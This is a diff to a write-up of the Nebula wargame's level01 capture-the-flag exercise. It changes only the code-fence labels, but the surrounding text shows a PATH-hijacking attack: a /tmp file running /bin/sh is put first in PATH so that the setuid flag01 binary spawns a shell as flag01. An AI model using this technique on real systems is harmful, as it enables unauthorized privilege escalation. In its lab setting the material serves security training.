@@ -29,19 +29,19 @@ int main(int argc, char **argv, char **envp)
 
 And write this code inside:
 
-```sh
+```bash
 /bin/sh
 ```
 
 Now change the `$PATH` variabile adding `/tmp` at the start:
 
-```sh
+```bash
 export PATH=/tmp:$PATH
 ```
 
 Go to `/home/flag01` directory and run `./flag01` binary to get a shell with flag01 account, verified by writing `id` command:
 
-```sh
+```bash
 level01@nebula:/home/flag01$ ./flag01 
 sh-4.2$ id
 uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
@@ -49,7 +49,7 @@ uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
 
 Now we can run `getflag` command:
 
-```sh
+```bash
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
 ```
